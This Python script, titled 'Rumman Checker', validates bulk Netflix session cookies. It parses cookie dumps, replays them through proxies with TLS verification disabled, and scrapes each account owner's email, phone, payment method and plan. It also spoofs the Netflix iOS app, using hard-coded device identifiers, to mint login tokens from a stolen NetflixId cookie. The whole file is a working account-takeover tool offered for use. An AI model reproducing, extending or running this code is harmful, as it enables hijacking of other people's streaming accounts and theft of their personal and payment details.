#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Rumman Checker - Netflix Cookie Checker
Vercel-compatible version (no tkinter, no GUI)
"""

import os
import sys
import re
import json
import time
import random
from datetime import datetime, timedelta, timezone
from typing import Tuple, Optional, Dict, List, Any

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================================================
# CONSTANTS
# ==================================================

DEBUG = False

MEMBERSHIP_URL = "https://www.netflix.com/account/membership"
YOUR_ACCOUNT_URL = "https://www.netflix.com/YourAccount"

# ==================================================
# UTILITIES
# ==================================================

def decode_value(value: Any) -> Optional[str]:
    if value is None:
        return None
    cleaned = str(value)
    cleaned = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = cleaned.replace('\\/', '/').replace('\\"', '"').replace('\\n', ' ').replace('\\t', ' ')
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned if cleaned else None

def country_to_flag(code: str) -> str:
    if not code or len(code) != 2:
        return ""
    try:
        return "".join(chr(127397 + ord(c)) for c in code.upper())
    except:
        return ""

def get_payment_category(payment_method: str) -> str:
    pm = payment_method.lower()
    
    card_keywords = ['credit', 'debit', 'card', 'visa', 'mastercard', 'amex', 
                     'american express', 'discover', 'jcb', 'rupay', 'maestro',
                     'credit card', 'debit card']
    if any(kw in pm for kw in card_keywords) or pm in ('cc', 'creditcard', 'debitcard'):
        return "CC"
    
    if 'paypal' in pm:
        return "PayPal"
    
    upi_keywords = ['upi', 'google pay', 'gpay', 'phonepe', 'paytm', 'amazon pay']
    if any(kw in pm for kw in upi_keywords):
        return "UPI"
    
    dcb_keywords = ['dcb', 'direct carrier billing', 'carrier billing', 'gopay', 'ovo', 'shopeepay']
    if any(kw in pm for kw in dcb_keywords):
        return "DCB"
    
    return "TP"

def get_country_code(country: str) -> str:
    if not country:
        return "XX"
    if re.match(r'^[A-Z]{2}$', country.upper()):
        return country.upper()[:2]
    match = re.search(r'([A-Z]{2})', country.upper())
    return match.group(1) if match else "XX"

def sanitize_filename_part(text: str, max_len: int = 25) -> str:
    if not text:
        return "unknown"
    cleaned = re.sub(r'[^a-zA-Z0-9@._-]', '_', text.lower())
    cleaned = re.sub(r'_+', '_', cleaned)
    if len(cleaned) > max_len:
        cleaned = cleaned[:max_len]
    return cleaned.strip('_')

def clean_phone_number(phone: str) -> str:
    if not phone:
        return ""
    has_plus = phone.strip().startswith('+')
    digits = re.sub(r'\D', '', phone)
    if has_plus and digits:
        return f"+{digits}"
    return digits

# ==================================================
# COOKIE PARSING
# ==================================================

def extract_cookie_bundles(content: str) -> List[Tuple[Dict[str, str], str, Dict[str, Any]]]:
    bundles = []
    
    try:
        data = json.loads(content)
        if isinstance(data, list):
            items = data
        elif isinstance(data, dict):
            items = data.get('cookies', [data])
        else:
            items = []
        
        cookie_sets = {}
        for item in items:
            if isinstance(item, dict):
                name = item.get('name')
                value = item.get('value')
                if name and value:
                    idx = item.get('index', 0)
                    if idx not in cookie_sets:
                        cookie_sets[idx] = {}
                    cookie_sets[idx][name] = value
        
        for idx, cookies in cookie_sets.items():
            if 'NetflixId' in cookies:
                netscape_lines = []
                for name, value in cookies.items():
                    domain = '.netflix.com'
                    secure = 'TRUE' if name == 'SecureNetflixId' else 'FALSE'
                    netscape_lines.append(f"{domain}\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
                netscape_content = "\n".join(netscape_lines)
                bundles.append((cookies, netscape_content, {}))
    except:
        pass
    
    if not bundles:
        blocks = re.split(r'\n\s*\n', content.strip())
        for block in blocks:
            if not block.strip():
                continue
            cookies = {}
            netscape_lines = []
            for line in block.splitlines():
                line = line.strip()
                if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
                    continue
                if line.startswith('#HttpOnly_'):
                    line = line[10:]
                parts = line.split('\t')
                if len(parts) >= 7:
                    domain = parts[0]
                    name = parts[5]
                    value = parts[6]
                    if 'netflix' in domain.lower():
                        cookies[name] = value
                        netscape_lines.append(line)
            if 'NetflixId' in cookies:
                bundles.append((cookies, "\n".join(netscape_lines), {}))
    
    if not bundles:
        cookies = {}
        netscape_lines = []
        patterns = {
            'NetflixId': r'NetflixId[=:"]+([^";\s]+)',
            'SecureNetflixId': r'SecureNetflixId[=:"]+([^";\s]+)',
        }
        for name, pattern in patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                cookies[name] = match.group(1)
                netscape_lines.append(f".netflix.com\tTRUE\t/\t{name == 'SecureNetflixId'}\t0\t{name}\t{match.group(1)}")
        if 'NetflixId' in cookies:
            bundles.append((cookies, "\n".join(netscape_lines), {}))
    
    return bundles

# ==================================================
# ACCOUNT INFO EXTRACTION
# ==================================================

def extract_account_info_from_netflix(html_content: str) -> Dict[str, Any]:
    info = {}
    
    def find(pattern, group=1):
        m = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
        return decode_value(m.group(group)) if m else None
    
    info['accountOwnerName'] = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"name":\s*"([^"]+)"')
    info['email'] = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"') or find(r'"loginId"\s*:\s*"([^"]+)"')
    info['countryOfSignup'] = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"')
    info['memberSince'] = find(r'"memberSince"\s*:\s*"([^"]+)"')
    info['nextBillingDate'] = find(r'"nextBillingDate"\s*:\s*"([^"]+)"')
    info['userGuid'] = find(r'"userGuid"\s*:\s*"([^"]+)"') or find(r'"ownerGuid"\s*:\s*"([^"]+)"')
    info['membershipStatus'] = find(r'"membershipStatus"\s*:\s*"([^"]+)"')
    info['videoQuality'] = find(r'"videoQuality"\s*:\s*"([^"]+)"')
    info['planPrice'] = find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"') or find(r'"displayPrice"\s*:\s*"([^"]+)"')
    
    streams = find(r'"maxStreams":\s*"?(\d+)"?')
    info['maxStreams'] = streams
    
    plan = find(r'"localizedPlanName":\s*"([^"]+)"')
    if plan:
        plan_lower = plan.lower()
        if 'premium' in plan_lower:
            info['plan'] = 'Premium'
        elif 'standard_with_ads' in plan_lower:
            info['plan'] = 'Standard With Ads'
        elif 'standard' in plan_lower:
            info['plan'] = 'Standard'
        elif 'basic' in plan_lower:
            info['plan'] = 'Basic'
        elif 'mobile' in plan_lower:
            info['plan'] = 'Mobile'
        else:
            info['plan'] = plan
    else:
        streams_val = info.get('maxStreams')
        if streams_val:
            try:
                if int(streams_val) >= 4:
                    info['plan'] = 'Premium'
                elif int(streams_val) >= 2:
                    info['plan'] = 'Standard'
                else:
                    info['plan'] = 'Basic'
            except:
                info['plan'] = 'Unknown'
        else:
            info['plan'] = 'Unknown'
    
    payment_method = None
    display = find(r'"displayText":\s*"([^"]+)"')
    if display:
        dl = display.lower()
        if 'paypal' in dl:
            payment_method = 'PayPal'
        elif 'gopay' in dl:
            payment_method = 'GoPay'
        elif 'dana' in dl:
            payment_method = 'DANA'
        elif 'ovo' in dl:
            payment_method = 'OVO'
        elif 'shopeepay' in dl:
            payment_method = 'ShopeePay'
        elif 'credit' in dl or 'card' in dl:
            payment_method = 'Credit Card'
        elif 'debit' in dl:
            payment_method = 'Debit Card'
        elif 'upi' in dl or 'google pay' in dl or 'phonepe' in dl:
            payment_method = 'UPI'
    if not payment_method:
        payment_method = find(r'"paymentMethodType":\s*"([^"]+)"') or "Unknown"
    info['paymentMethod'] = payment_method
    
    phone = find(r'"phoneNumber":\s*"([^"]+)"')
    if phone:
        info['phoneNumber'] = clean_phone_number(phone)
    
    hold = re.search(r'"isUserOnHold":\s*(true|false)', html_content)
    info['holdStatus'] = "Yes" if (hold and hold.group(1) == "true") else "No"
    
    profiles = []
    prof_section = re.search(r'"profiles":\s*\[(.*?)\]', html_content, re.DOTALL)
    if prof_section:
        for name_match in re.finditer(r'"name":\s*"([^"]+)"', prof_section.group(1)):
            name = decode_value(name_match.group(1))
            if name and name not in profiles:
                profiles.append(name)
    if profiles:
        info['profiles'] = ", ".join(profiles)
        info['profileCount'] = len(profiles)
    
    info['is_subscribed'] = info.get('membershipStatus', '').upper() == 'CURRENT_MEMBER'
    return info

# ==================================================
# NETFLIX CHECKER
# ==================================================

def check_account(cookies: Dict[str, str], proxy: Optional[str] = None, timeout: int = 20) -> Tuple[bool, Dict[str, Any], str]:
    session = requests.Session()
    for name, value in cookies.items():
        session.cookies.set(name, value, domain='.netflix.com', path='/')
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    
    proxies = {}
    if proxy:
        proxies = {'http': proxy, 'https': proxy}
    
    try:
        resp = session.get(MEMBERSHIP_URL, headers=headers, proxies=proxies, timeout=timeout, verify=False, allow_redirects=True)
        if resp.status_code == 200:
            info = extract_account_info_from_netflix(resp.text)
            if info.get('email'):
                return info.get('is_subscribed', False), info, resp.text
        
        resp2 = session.get(YOUR_ACCOUNT_URL, headers=headers, proxies=proxies, timeout=timeout, verify=False, allow_redirects=True)
        if resp2.status_code == 200:
            info = extract_account_info_from_netflix(resp2.text)
            if info.get('email'):
                return info.get('is_subscribed', False), info, resp2.text
        
        if 'login' in resp.url.lower() or 'signup' in resp.url.lower():
            return False, {}, "Redirected to login"
        return False, {}, f"HTTP {resp.status_code}"
    except requests.exceptions.Timeout:
        return False, {}, "Timeout"
    except requests.exceptions.ProxyError:
        return False, {}, "Proxy error"
    except Exception as e:
        return False, {}, str(e)[:50]

# ==================================================
# NFTOKEN GENERATION (THE IMPORTANT PART)
# ==================================================

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def create_nftoken(cookies: Dict[str, str]) -> Optional[Dict]:
    netflix_id = cookies.get('NetflixId')
    if not netflix_id:
        return None
    
    headers = dict(NFTOKEN_HEADERS)
    headers['Cookie'] = f'NetflixId={netflix_id}'
    
    try:
        resp = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=15, verify=False)
        if DEBUG:
            print(f"NFToken API status: {resp.status_code}")
        
        if resp.status_code == 200:
            data = resp.json()
            token_data = (((data.get('value') or {}).get('account') or {}).get('token') or {}).get('default') or {}
            token = token_data.get('token')
            if token:
                expires = datetime.now(timezone.utc) + timedelta(hours=1)
                return {
                    'token': token,
                    'expires_at_utc': expires.strftime("%Y-%m-%d %H:%M:%S UTC")
                }
    except Exception as e:
        if DEBUG:
            print(f"NFToken exception: {e}")
    return None
